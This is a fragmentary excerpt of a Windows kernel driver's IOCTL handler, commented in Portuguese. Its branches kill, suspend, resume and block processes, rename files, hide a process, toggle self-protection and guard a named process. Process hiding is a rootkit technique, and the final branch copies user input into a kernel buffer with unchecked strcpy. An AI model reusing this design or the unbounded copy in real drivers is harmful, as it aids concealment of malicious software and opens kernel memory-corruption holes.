...
/// </summary>
/// 
/// <param name="DeviceObject">Dispositivo</param>
...
NTSTATUS IRPRecebido(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
{
	...
	else if (Io->Parameters.DeviceIoControl.IoControlCode == TERMINAR_PROCESSO_E_BLOQUEAR)
	{
		...
		// Arquivo completo
		PUNICODE_STRING Arquivo = ExAllocatePoolWithTag(PagedPool, 800, 'KIC5');
	...
	else if (Io->Parameters.DeviceIoControl.IoControlCode == RENOMEAR_ARQUIVO)
	{
		...
		*/
		...
		// Abra o arquivo
		NTSTATUS Status = AbrirArquivoIRP(Un, DELETE, &IoB, &Objeto, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE);
		...
		if (NT_SUCCESS(Status))
		{
			...
			if (Renomear)
			{
				...
				// Renomeie
				if (NT_SUCCESS(IoSetInformation(Objeto, FileRenameInformation, 1024, Renomear)))
				{
					StatusRetornar = "success!";
				}
	...
	else if (Io->Parameters.DeviceIoControl.IoControlCode == OCULTAR_PROCESSO)
	{
		...
		if (Un.Buffer != NULL)
		{
			...
			// Se conseguir ocultar o processo
			if (NT_SUCCESS(OcultarProcesso(Pid)))
			{
				StatusRetornar = "success!";
			}
	...
	// Negar processos
	else if (Io->Parameters.DeviceIoControl.IoControlCode == BLOQUEAR_PROCESSOS)
	{
		NegarProcessos = !NegarProcessos;
		StatusRetornar = "success!";
	}
	// Se for para alterar a auto-defesa
	else if (Io->Parameters.DeviceIoControl.IoControlCode == AUTO_DEFESA)
	{
		// Altere de acordo
		Autoprotecao = !Autoprotecao;
		StatusRetornar = "success!";
	}
	// Se for para suspender
	else if (Io->Parameters.DeviceIoControl.IoControlCode == SUSPENDER_PROCESSO)
	{
		// ANSI_STRING e UNICODE
		ANSI_STRING As;
		UNICODE_STRING Un;
		...
		if (Un.Buffer != NULL)
		{
			...
			if (NT_SUCCESS(SuspenderProcesso(Processo)))
			{
				StatusRetornar = "success!";
			}
	...
	// Se for para resumir
	else if (Io->Parameters.DeviceIoControl.IoControlCode == RESUMIR_PROCESSO)
	{
		// ANSI_STRING e UNICODE
		ANSI_STRING As;
		UNICODE_STRING Un;
		...
		if (Un.Buffer != NULL)
		{
			...
			// Tente resumir o processo
			if (NT_SUCCESS(ResumirProcesso(Processo)))
			{
				StatusRetornar = "success!";
			}
	...
	// Se for para proteger o processo do Nottext
	else if (Io->Parameters.DeviceIoControl.IoControlCode == PROTEGER_NOTTEXT)
	{
		// Copie o nome do processo do Nottext para proteger
		strcpy(NottextProcesso, MensagemUsuario);
	}
